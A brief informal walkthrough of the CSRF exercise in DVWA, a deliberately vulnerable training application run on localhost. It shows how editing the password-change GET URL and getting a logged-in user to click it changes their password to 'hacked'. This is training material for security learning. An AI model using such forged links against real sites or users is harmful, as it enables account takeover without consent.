Aight, this is tricky.

quick steps to perform this:
1. change password first
2. you will see a url similar to this:`http://localhost/DVWA/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#` 
3. now, if you change the URL, and on the same browser, make someone click that URL, the password changes.
4. So say you change the URL to this: `http://localhost/DVWA/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change#`
5. Now, enter that URL, and test credentials. Check for your last password, and it won't work.